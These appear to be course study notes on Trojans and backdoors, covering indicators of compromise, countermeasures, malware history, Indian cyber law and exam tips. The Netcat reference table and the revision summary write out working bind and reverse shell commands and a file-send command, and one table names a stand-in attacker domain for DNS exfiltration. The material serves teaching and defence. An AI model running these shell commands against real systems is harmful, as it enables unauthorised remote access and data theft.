| Indicator | What It Suggests |
|---|---|
| Unfamiliar processes in Task Manager | Trojan or RAT running as background process |
| Legitimate process with unusual parent | Process injection — Trojan injected into explorer.exe, svchost.exe |
| nc.exe, netcat.exe in process list | Netcat backdoor running |
| High CPU/memory from unknown process | Botnet Trojan / crypto miner |
| Duplicate process names | Masquerading — Trojan named svchost.exe (with typo or extra space) |

**File System Indicators:**

| Indicator | What It Suggests |
|---|---|
| New files in startup folders | Persistence mechanism installed |
| Files in %TEMP% or %APPDATA% with random names | Dropper/downloader artefacts |
| Modified system file timestamps | Timestomping — attacker hiding activity |
| New DLL files in system directories | DLL hijacking persistence |
| New scheduled tasks | Trojan persistence via schtasks |
| Unexpected files in C:\Windows\System32 | Trojan masquerading as system file |

**Registry Indicators:**

| Registry Location | What To Check |
|---|---|
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Unexpected autostart entries |
| HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | User-level autostart |
| HKLM\SYSTEM\CurrentControlSet\Services | Unexpected new services |
| HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon | Shell or Userinit hijacking |

**System Behaviour Indicators:**

| Behaviour | What It Suggests |
|---|---|
| Webcam light activates unexpectedly | RAT accessing webcam (T1125) |
| Mouse moves or windows open without user input | RAT with remote desktop active |
| Browser redirects to unexpected pages | Browser hijacker Trojan |
| Antivirus suddenly disabled | Trojan killing AV process |
| New user accounts created | Persistence via new admin account |
| Firewall rules modified | Trojan opening inbound ports |

---

### 6.2 Network-Based Indicators

**WHAT:**
Network-based indicators are observable in network traffic or logs —
detectable via monitoring tools like Wireshark, IDS, or SIEM.

| Indicator | What It Suggests |
|---|---|
| Unexpected outbound connections on non-standard ports | Bind/reverse shell or C2 beacon |
| Periodic beaconing (regular intervals) | C2 beacon — Trojan checking in |
| Large outbound data transfers to unknown IPs | Data exfiltration |
| DNS queries to newly registered or random-looking domains | DGA (Domain Generation Algorithm) C2 |
| Outbound connections to known malicious IPs/domains | Trojan connecting to known C2 |
| HTTPS traffic to unusual certificate subjects | Trojan using self-signed cert for C2 |
| Unusually high volume of DNS queries | DNS tunnelling covert channel |
| Same source port used repeatedly across connections | Poorly implemented Trojan |
| ICMP traffic with large payloads | ICMP covert channel |

**Beaconing Pattern:**
00:00 — victim connects to C2 00:30 — victim connects to C2 01:00 — victim connects to C2 01:30 — victim connects to C2 → Regular 30-second intervals = textbook C2 beaconing signature

Defenders look for this regularity in outbound connection logs.
Some advanced Trojans use jitter (random ±variation in beacon
interval) to evade interval-based detection.

**MITRE ATT&CK:**
- T1071 — Application Layer Protocol (C2 over HTTP/HTTPS/DNS)
- T1568 — Dynamic Resolution (DGA domains)
- T1132 — Data Encoding

---

### 6.3 Trojan Countermeasures

**Prevention Controls:**

| Control | What It Prevents |
|---|---|
| Email filtering / sandboxing | Blocks Trojan-laden attachments before delivery |
| Web proxy with SSL inspection | Inspects HTTPS traffic — detects C2 in encrypted channel |
| Application whitelisting | Only approved executables can run — blocks Trojan execution |
| User awareness training | Phishing recognition — primary Trojan delivery vector |
| Software integrity verification | Hash verification of downloads — detects trojanised software |
| Patch management | Closes drive-by download and watering hole vectors |
| Disable macros by default | Prevents Word/Excel macro Trojans |

**Detection Controls:**

| Control | What It Detects |
|---|---|
| Endpoint Detection & Response (EDR) | Process injection, suspicious child processes, C2 beaconing |
| Network IDS/IPS (Snort/Suricata) | Known Trojan signatures in traffic |
| SIEM correlation rules | Beaconing patterns, unusual outbound, new persistence keys |
| Threat Intelligence feeds | Known C2 IPs and domains → block at firewall/proxy |
| Autoruns analysis (Sysinternals) | All persistence mechanisms in one view |
| Netstat monitoring | Unexpected listening ports and outbound connections |

**Response Controls:**

| Control | Action |
|---|---|
| Network isolation | Immediately isolate compromised host — stop exfiltration |
| Memory forensics (Volatility) | Extract in-memory Trojan artefacts |
| EDR kill/quarantine | Terminate malicious process, quarantine files |
| Re-image affected systems | Remove all persistence mechanisms reliably |
| IOC sharing | Share C2 IPs, domains, hashes with threat intel platforms |
| Root cause analysis | Identify initial delivery vector — close it |

> [!IMPORTANT]
> Re-imaging is the only reliable way to ensure a Trojan and all its
> persistence mechanisms are fully removed. "Cleaning" a compromised
> system risks missing hidden persistence — especially rootkit-assisted
> Trojans that can hide their own files and registry entries.
---

## 📌 Extra Notes

### Framework Comparisons

**Bind Shell vs Reverse Shell vs Web Shell**

| | Bind Shell | Reverse Shell | Web Shell |
|---|---|---|---|
| Who listens | Victim | Attacker | Web server (victim) |
| Connection direction | Attacker → Victim | Victim → Attacker | Attacker → Victim (HTTP) |
| Firewall bypass | ❌ Usually blocked | ✅ Usually allowed | ✅ Port 80/443 always open |
| Requires web server | ❌ No | ❌ No | ✅ Yes |
| Example tool | nc -lvnp -e cmd | nc -e cmd [attacker] | China Chopper, WSO |
| MITRE ID | T1059 | T1059 | T1505.003 |

**Meterpreter vs Netcat**

| | Meterpreter | Netcat |
|---|---|---|
| Encryption | ✅ TLS by default | ❌ Plaintext (unless cryptcat/ncat) |
| In-memory | ✅ Runs entirely in memory | ❌ File on disk |
| Feature set | Full RAT capabilities | Basic shell only |
| AV detection | Targeted — evasion built in | Often flagged |
| Legitimate use | ❌ Pentest/attack only | ✅ Sysadmin tool |
| Stability | High | Basic |
| Pivot/port forward | ✅ Built-in | ❌ Manual |

**RAT vs Backdoor vs Rootkit**

| | RAT | Backdoor | Rootkit |
|---|---|---|---|
| Primary function | Full remote control | Shell/command access | Hide malware presence |
| GUI capability | ✅ Often | ❌ Rarely | N/A |
| Keylogging | ✅ Yes | ❌ Rarely | N/A |
| Self-concealment | ❌ Not primary | ❌ Not primary | ✅ Primary function |
| Survives AV scan | ❌ Sometimes | ❌ Sometimes | ✅ Designed to |
| Works with Trojans | ✅ Is a Trojan type | ✅ Trojan installs it | ✅ Hides the Trojan |

---

### Predecessor / Successor Chains

**Backdoor / RAT Evolution:**
NetBus (1998) → Back Orifice / BO2K (1999) → SubSeven (1999) → Poison Ivy (2005) → Gh0st RAT (2008) → DarkComet (2008) → njRAT (2013) → AsyncRAT (2019) → Havoc C2 / Sliver (2022+)


**Banking Trojan Evolution:**
Zeus / Zbot (2007) → SpyEye (2010) → Citadel (2011) → GameOver Zeus (2011) → Dridex (2014) → TrickBot (2016) → Emotet (reloaded 2022) → IcedID / BokBot (2017–2024) → QakBot (disrupted 2023) → Pikabot (2023–2024)


**C2 Framework Evolution:**
Metasploit (2003) → CANVAS (2005) → Cobalt Strike (2012) → PowerShell Empire (2015) → Covenant (2019) → Sliver (2020) → Havoc C2 (2022) → Villain (2023)


---

### 🌐 Current Landscape (2026)

**AI Tools Changing the Attack Surface:**
- **LLM-generated Trojan lures (2024–2025):** GPT-class models
  produce flawless phishing emails and fake software pages in any
  language — dramatically lowering the quality bar for social
  engineering that delivers Trojans. Previously detectable by
  grammar/spelling errors — now indistinguishable from legitimate
  communications.
- **AI-assisted C2 traffic blending:** Emerging research (2024)
  shows ML models generating C2 beacon timing and HTTP header
  patterns that statistically match legitimate CDN traffic —
  evading ML-based anomaly detection in SIEM/EDR.
- **AI-generated malware variants (2025):** Tools like WormGPT
  and FraudGPT (dark web LLMs) offer Trojan generation as a
  service — no coding skill required. Lowers barrier to entry
  for script kiddies significantly.

**Cloud Challenges:**
- **Cloud-hosted C2:** Attackers increasingly host C2 servers on
  AWS, Azure, and GCP using legitimate cloud accounts — C2 traffic
  blends with expected cloud provider communications. Blocking by
  IP range is impossible (blocks legitimate cloud services too).
- **SSRF → Cloud metadata:** Trojans deployed on cloud-hosted
  workloads can use SSRF to reach instance metadata service
  (169.254.169.254 on AWS) and steal IAM credentials —
  escalating from host compromise to cloud account takeover.
- **Container escape Trojans (2024):** Trojans targeting
  containerised workloads (Docker, Kubernetes) designed to
  escape container isolation and pivot to the host or other
  pods in the cluster.

**Current CVEs (2024–2026):**
- **CVE-2024-21412 (Windows SmartScreen bypass — 2024):**
  Exploited in the wild to bypass Windows SmartScreen warnings
  when delivering Trojan payloads via crafted .url and .lnk files.
  Used by APT groups to deliver DarkGate and Water Hydra Trojans.
  CVSS 8.1. Patched February 2024 Patch Tuesday.
- **CVE-2024-38213 (Windows Mark of the Web bypass — 2024):**
  Allowed Trojan delivery via crafted files that bypassed the
  MOTW security warning. Actively exploited before patch.
- **CVE-2023-23397 (Outlook NTLM theft — zero-click — 2023):**
  Trojan-like behaviour — malicious Outlook calendar invite
  triggers automatic NTLM hash leak to attacker's server.
  No user interaction required. CVSS 9.8. APT28 exploited.

**Indian Legal Context:**
- **IT Act 2000 — Section 66:** Installing a Trojan or backdoor
  on another's system without authorisation = unauthorised computer
  access. Penalty: Up to 3 years + ₹5 lakh fine.
- **IT Act 2000 — Section 43(b):** Downloading, copying or
  extracting data using malware (Trojan/infostealer) =
  civil liability. Compensation up to ₹1 crore.
- **IT Act 2000 — Section 66B:** Receiving stolen computer data
  (credentials exfiltrated by Trojans). Penalty: Up to 3 years
  + ₹1 lakh fine.
- **IT Act 2000 — Section 66F:** If a Trojan/backdoor is used
  to penetrate critical infrastructure (power, banking, defence)
  with intent to threaten national security = cyber terrorism.
  Penalty: Life imprisonment.
- **DPDPA 2023:** Organisations whose systems are compromised
  by Trojans resulting in personal data exfiltration must notify
  the Data Protection Board. Breach penalty: Up to ₹250 crore.
  Failure to notify: Up to ₹200 crore.
- **IPC Section 420:** If a Trojan is used for financial fraud
  (banking Trojan / transaction manipulation) — cheating and
  dishonestly inducing delivery of property.
  Penalty: Up to 7 years + fine.

---

### Terminology Traps

| Term | Trap | Clarification |
|---|---|---|
| **Trojan vs RAT** | Used interchangeably | A RAT is a TYPE of Trojan. Not all Trojans are RATs. A downloader Trojan is not a RAT. |
| **Backdoor vs Trojan** | Used interchangeably | A Trojan DELIVERS a backdoor. The backdoor is the persistent access mechanism. The Trojan is the delivery/disguise vehicle. |
| **Reverse shell vs reverse proxy** | Sound similar | A reverse shell gives command-line access. A reverse proxy forwards traffic. Completely different functions. |
| **Bind shell on victim** | Assumed attacker listens | In a bind shell, the VICTIM listens. The ATTACKER connects IN. This is the opposite of reverse shell. |
| **Covert channel = encrypted channel** | Often confused | Covert channels hide the EXISTENCE of communication — encryption hides the CONTENT. A covert channel can be unencrypted (timing channel, DNS subdomain encoding). |
| **Netcat = malware** | Assumed malicious | Netcat is a legitimate tool. Its MISUSE as a backdoor is malicious. Detecting nc.exe is not an automatic IOC — context required. |
| **HTTP tunnelling = VPN** | Sometimes confused | HTTP tunnelling wraps arbitrary traffic inside HTTP. A VPN wraps traffic inside encrypted tunnel protocols (IPSec, OpenVPN). Different purposes and mechanisms. |
| **DGA domain = typosquat domain** | Sometimes confused | DGA = Domain Generation Algorithm — mathematically generates many random domains for C2 resilience. Typosquatting = registering domains similar to legitimate ones for phishing. Different techniques. |

---

## Abbreviations Table

| Abbreviation | Full Form | One-Line Meaning |
|---|---|---|
| APT | Advanced Persistent Threat | Nation-state or sophisticated threat actor conducting long-term targeted intrusions |
| BO2K | Back Orifice 2000 | Classic Windows backdoor tool by Cult of the Dead Cow (1999) |
| C2 | Command and Control | Attacker-controlled server sending commands to and receiving data from malware |
| CDN | Content Delivery Network | Distributed server network (Cloudflare, Akamai) — abused for domain fronting |
| DGA | Domain Generation Algorithm | Algorithm producing many pseudo-random domain names for C2 resilience |
| DLL | Dynamic Link Library | Windows shared library file — abused in DLL hijacking persistence |
| EDR | Endpoint Detection and Response | Security tool monitoring endpoints for threats in real time |
| HTTP | Hypertext Transfer Protocol | Web protocol on port 80 — commonly tunnelled for C2 |
| HTTPS | HTTP Secure | Encrypted web protocol on port 443 — preferred C2 transport |
| ICMP | Internet Control Message Protocol | Network diagnostic protocol (ping) — used in ICMP covert channels |
| IDS | Intrusion Detection System | Monitors network/host for attack signatures and anomalies |
| IOC | Indicator of Compromise | Artefact (hash, IP, domain, registry key) indicating compromise |
| IPS | Intrusion Prevention System | IDS with ability to block detected threats |
| IRC | Internet Relay Chat | Old chat protocol — historically used as C2 for botnets |
| MitB | Man-in-the-Browser | Attack where malware sits inside browser and manipulates transactions |
| MOTW | Mark of the Web | Windows security tag on files downloaded from internet — triggers SmartScreen |
| RAT | Remote Access Trojan | Trojan providing full remote graphical/command control of victim machine |
| RDP | Remote Desktop Protocol | Windows remote desktop protocol — port 3389 |
| SIEM | Security Information and Event Management | Platform aggregating and correlating security logs |
| SSRF | Server-Side Request Forgery | Vulnerability making server issue requests to internal resources |
| SVR | Foreign Intelligence Service of Russia | Russian intelligence agency — attributed to APT29/Cozy Bear |
| TCP | Transmission Control Protocol | Connection-oriented transport protocol — used by most Trojan C2 |
| TTL | Time to Live | IP header field — can be abused for storage covert channel |
| UDP | User Datagram Protocol | Connectionless transport — used in DNS tunnelling |
| VPN | Virtual Private Network | Encrypted tunnel for network traffic |
| WAF | Web Application Firewall | Filters HTTP traffic — detects web shell activity |

---

## 🔑 Keywords + Concept Map

**Core Keywords:**
Trojan Horse · Backdoor · RAT · Bind Shell · Reverse Shell ·
Overt Channel · Covert Channel · HTTP Tunnelling · DNS Tunnelling ·
Netcat · Meterpreter · Cobalt Strike · Beaconing · DGA ·
Downloader Trojan · Infostealer · Banking Trojan · Proxy Trojan ·
Destructive Trojan · Botnet Trojan · Form Grabbing · MitB ·
Persistence · Registry Run Key · Scheduled Task · Process Injection ·
SUNBURST · Zeus · TrickBot · DarkComet · Gh0st RAT · AsyncRAT ·
IOC · EDR · Re-image · MITRE ATT&CK TA0003 · TA0011

```
**Concept Map:**
TROJANS & BACKDOORS
│
├── Delivery Vectors
│   ├── Phishing (T1566) · Drive-by (T1189)
│   ├── Trojanised Software (T1195.002)
│   └── USB Drop · Social Engineering
│
├── Types of Trojans
│   ├── RAT ──────────── Full remote control (DarkComet, AsyncRAT)
│   ├── Backdoor ─────── Shell access (Poison Ivy, NetBus)
│   ├── Downloader ───── Stage 1 → pulls full payload (Emotet, BumbleBee)
│   ├── Infostealer ──── Credentials, cookies, wallets (RedLine, Vidar)
│   ├── Banking ──────── Form grab, MitB, OTP steal (Zeus, Dridex)
│   ├── Proxy ────────── Route attacker traffic through victim
│   ├── Destructive ──── Wiper (NotPetya, Shamoon)
│   └── Botnet ───────── Enrol in botnet (Mirai, QakBot)
│
├── C2 Communication
│   ├── Overt Channel ── Legitimate protocol (HTTPS, DNS)
│   ├── Covert Channel ─ Hidden in overt traffic
│   │   ├── Storage ──── DNS subdomain, IP TTL, HTTP header
│   │   └── Timing ───── Packet interval encoding
│   └── HTTP Tunnelling ─ C2 wrapped in HTTP/HTTPS
│
├── Shell Types
│   ├── Bind Shell ───── Victim listens → attacker connects IN ❌ firewall
│   └── Reverse Shell ── Victim connects OUT → attacker listens ✅ bypass
│       └── Netcat, Meterpreter, Cobalt Strike Beacon
│
├── Persistence (TA0003)
│   ├── Registry Run Key (T1547.001)
│   ├── Scheduled Task (T1053.005)
│   ├── Cron Job (T1053.003)
│   └── Service Installation (T1543)
│
└── Indicators (IOCs)
    ├── Host: unexpected process, open port, new reg key
    └── Network: beaconing, DGA, large outbound, DNS tunnelling
```
---

## ⚡ Quick Reference Cheatsheet

### Trojan Type Quick Reference

| Trojan Type | Primary Goal | Key Example | MITRE Tactic |
|---|---|---|---|
| RAT | Full remote control | DarkComet, AsyncRAT | TA0009 Collection |
| Backdoor | Persistent shell access | Poison Ivy, BO2K | TA0003 Persistence |
| Downloader | Pull additional payloads | Emotet, BumbleBee | T1105 |
| Infostealer | Steal credentials/data | RedLine, Vidar | T1555, T1539 |
| Banking | Financial fraud | Zeus, Dridex | T1185, T1056.003 |
| Proxy | Route attacker traffic | Various | T1090 |
| Destructive/Wiper | Destroy data/systems | NotPetya, Shamoon | T1485 |
| Botnet | DDoS/spam/mining | Mirai, QakBot | TA0011 |

### Bind Shell vs Reverse Shell

| Property | Bind Shell | Reverse Shell |
|---|---|---|
| Victim role | LISTENS | CONNECTS |
| Attacker role | CONNECTS | LISTENS |
| Connection direction | Inbound to victim | Outbound from victim |
| Firewall bypass | ❌ Blocked | ✅ Allowed |
| Netcat victim cmd | nc -lvnp 4444 -e cmd.exe | nc [attacker] 4444 -e cmd.exe |
| Netcat attacker cmd | nc [victim] 4444 | nc -lvnp 4444 |
| Preferred by attacker | ❌ No | ✅ Yes |

### Netcat Command Reference

| Purpose | Command |
|---|---|
| Listen on port | nc -lvnp 4444 |
| Connect to host | nc [ip] [port] |
| Bind shell (Windows victim) | nc -lvnp 4444 -e cmd.exe |
| Bind shell (Linux victim) | nc -lvnp 4444 -e /bin/bash |
| Reverse shell (Windows victim) | nc [attacker_ip] 4444 -e cmd.exe |
| Reverse shell (Linux victim) | nc [attacker_ip] 4444 -e /bin/bash |
| File send | nc [ip] 4444 < file.txt |
| File receive | nc -lvnp 4444 > received.txt |
| Banner grab | nc -nv [ip] [port] |

### Covert Channel Types

| Type | Subtype | Example |
|---|---|---|
| Storage | DNS subdomain | cmd.a7f3k.evil.com |
| Storage | IP TTL field | Encode bits in TTL value |
| Storage | HTTP User-Agent | Data in UA string |
| Storage | ICMP payload | Data in ping packet body |
| Timing | Packet interval | 1 = send now, 0 = wait 100ms |
| Timing | Retransmission | Deliberate retransmit pattern |

### Key Persistence Registry Locations

| Location | Type |
|---|---|
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | System-wide autostart |
| HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Per-user autostart |
| HKLM\SYSTEM\CurrentControlSet\Services | Service-based persistence |
| HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon | Shell hijacking |

### Notable Trojans / Backdoors — Quick Reference

| Name | Year | Category | Notable For |
|---|---|---|---|
| Back Orifice (BO2K) | 1999 | Backdoor RAT | First major Windows RAT — Cult of Dead Cow |
| Zeus (Zbot) | 2007 | Banking Trojan | Blueprint for all banking Trojans — form grabbing |
| Gh0st RAT | 2008 | RAT | Chinese APT — Operation Aurora (Google, 2010) |
| DarkComet | 2008 | RAT | Feature-rich — used in Syrian APT campaigns |
| Poison Ivy | 2005 | Backdoor RAT | APT1 (Comment Crew) primary tool |
| Shamoon | 2012 | Destructive/Wiper | 30,000 Saudi Aramco machines wiped |
| SUNBURST | 2020 | Supply chain backdoor | SolarWinds — APT29 — 18,000+ victims |
| NotPetya | 2017 | Destructive/Wiper | Disguised as ransomware — $10B+ damage |
| RedLine Stealer | 2021 | Infostealer | Dominant credential stealer 2021–2024 |
| QakBot | 2008 | Banking/Botnet | Disrupted August 2023 — Operation Duck Hunt |
| AsyncRAT | 2019 | RAT | Open-source — active in 2024–2025 campaigns |

### Key Penalty Reference

| Law | Section | Offence | Penalty |
|---|---|---|---|
| IT Act 2000 | S.66 | Trojan/backdoor = unauthorised access | 3 yrs + ₹5L |
| IT Act 2000 | S.66B | Receiving stolen data via Trojan | 3 yrs + ₹1L |
| IT Act 2000 | S.43(b) | Data theft via malware | Civil — up to ₹1 crore |
| IT Act 2000 | S.66F | Trojan on critical infrastructure | Life imprisonment |
| IPC | S.420 | Financial fraud via banking Trojan | 7 yrs + fine |
| DPDPA 2023 | — | Data breach via Trojan | Up to ₹250 crore |
| DPDPA 2023 | — | Failure to notify breach | Up to ₹200 crore |

---

## ✅ Session Revision Snapshot

**5-Bullet TL;DR:**

1. **A Trojan disguises itself as legitimate software — it does NOT
   self-replicate.** The three-way distinction (Trojan = no replication,
   Virus = needs host file, Worm = spreads automatically) is the most
   tested malware classification concept across all sessions.

2. **Reverse shells bypass firewalls because the victim connects OUTBOUND
   to the attacker** — most firewalls allow outbound connections by default.
   Bind shells require inbound connections to the victim — typically blocked.
   This is why reverse shells are universally preferred by attackers.

3. **Netcat creates bind and reverse shells with a single command line.**
   Victim bind shell: `nc -lvnp 4444 -e cmd.exe`.
   Victim reverse shell: `nc [attacker] 4444 -e cmd.exe`.
   Know both commands, know which direction each connection travels.

4. **Covert channels hide communication INSIDE legitimate traffic** —
   DNS subdomains, HTTPS bodies, ICMP payloads, HTTP headers.
   They are different from encrypted channels — encryption hides content,
   covert channels hide the existence of communication itself.

5. **SUNBURST (SolarWinds 2020) is the benchmark supply chain Trojan case.**
   18,000+ organisations. Signed legitimate update. APT29.
   Teaches: trusted vendor + valid signature ≠ safe.

> 🎯 **MCQ-likely:** Trojan vs virus vs worm traits, bind vs reverse shell
> direction, Netcat commands and flags, covert vs overt channel definition,
> SUNBURST case details, Zeus = banking Trojan, NotPetya = wiper not ransomware,
> IT Act sections for Trojan-related offences, beaconing definition,
> TA0003 = Persistence, TA0011 = C2.

> 💼 **Interview-likely:** Why does a reverse shell bypass a firewall?
> What is the difference between a Trojan and a virus? What is a covert
> channel and give an example? How does Netcat create a backdoor?
> What was SUNBURST and why was it significant?

---

## Next Session Bridge

Session 12B established how attackers deliver, deploy, and maintain
Trojans and backdoors — including reverse shells and covert C2 channels.
Session 13 continues this thread by covering how attackers **conceal
and weaponise** these tools: Trojan construction kits (automated Trojan
builders), wrapping techniques (binding malicious payload with legitimate
executable), evasion methods (bypassing AV detection), and system file
verification techniques defenders use to detect tampering.
The progression is: deliver the Trojan (12B) → hide the Trojan (13) →
survive detection (13) → maintain long-term access.

---

<details>
<summary>📖 Glossary</summary>

| Term | Definition |
|---|---|
| AsyncRAT | Open-source remote access Trojan — actively used in 2024–2025 APT campaigns |
| Back Orifice (BO2K) | Classic Windows backdoor by Cult of the Dead Cow (1999) — historically significant |
| Backdoor | Hidden persistent access mechanism bypassing normal authentication controls |
| Banking Trojan | Trojan targeting online banking — form grabbing, MitB, OTP interception |
| Beaconing | Regular periodic outbound connections from infected host to C2 server |
| Bind Shell | Shell where victim listens and attacker connects inbound — blocked by firewalls |
| Botnet Trojan | Trojan enrolling victim into botnet for DDoS, spam, or mining operations |
| Covert Channel | Hidden communication pathway violating security policy — hides existence of communication |
| Cobalt Strike | Commercial offensive security framework — Beacon payload used by red teams and APTs |
| C2 | Command and Control server — attacker infrastructure managing infected hosts |
| DarkComet | Feature-rich RAT widely used in APT campaigns — Syrian targeting historically |
| DGA | Domain Generation Algorithm — generates many random domains for C2 resilience |
| Downloader Trojan | Stage-1 Trojan downloading and executing the real payload after initial compromise |
| Domain Fronting | Using CDN as proxy so C2 traffic appears to originate from legitimate CDN domain |
| Dridex | Banking Trojan linked to Evil Corp (Russia) — targeting European financial institutions |
| Emotet | Notorious botnet/downloader — disrupted 2021, returned 2022 |
| Form Grabbing | Intercepting browser form data before HTTPS encryption — used in banking Trojans |
| Gh0st RAT | Chinese RAT used in Operation Aurora (Google, 2010) and multiple APT campaigns |
| HTTP Tunnelling | Encapsulating non-HTTP traffic inside HTTP/HTTPS requests to bypass firewalls |
| Infostealer | Trojan harvesting credentials, cookies, wallets, and system information |
| IOC | Indicator of Compromise — artefact indicating system compromise (hash, IP, registry key) |
| Jitter | Random variation in beacon interval to evade interval-based C2 detection |
| Man-in-the-Browser | Attack where malware inside browser manipulates financial transactions in real time |
| Meterpreter | Metasploit's advanced in-memory payload — encrypted, feature-rich reverse shell |
| Netcat | Lightweight network utility creating TCP/UDP connections — dual-use as backdoor |
| njRAT | Remote access Trojan widely used in Middle East and North Africa APT campaigns |
| NotPetya | 2017 wiper disguised as ransomware — $10B+ damage — attributed to Russia (Sandworm) |
| Overt Channel | Legitimate, intended, policy-permitted communication pathway |
| Poison Ivy | Classic backdoor RAT — primary tool of APT1 (Comment Crew) |
| Proxy Trojan | Trojan converting victim into proxy server to anonymise attacker traffic |
| QakBot | Long-running banking Trojan and botnet — disrupted August 2023 in Operation Duck Hunt |
| RAT | Remote Access Trojan — provides full remote control including screen, files, camera |
| RedLine Stealer | Dominant infostealer 2021–2024 — sold as MaaS on dark web |
| Reverse Shell | Shell where victim connects outbound to attacker's listener — bypasses firewalls |
| Shamoon | Destructive wiper — wiped 30,000+ Saudi Aramco systems in 2012 |
| Sliver | Open-source Go-based C2 framework — modern alternative to Cobalt Strike |
| socat | Extended Netcat with SSL support — used for encrypted reverse shells |
| SUNBURST | Backdoor Trojan delivered via SolarWinds Orion update — APT29 — 2020 |
| Supply Chain Attack | Compromising software/hardware before it reaches the target organisation |
| TrickBot | Banking Trojan evolved into general-purpose loader and botnet |
| Trojan Horse | Malware disguised as legitimate software — does not self-replicate |
| Web Shell | Malicious script uploaded to web server providing remote command execution via HTTP |
| Zeus (Zbot) | Foundational banking Trojan (2007) — blueprint for all subsequent banking malware |

</details>

---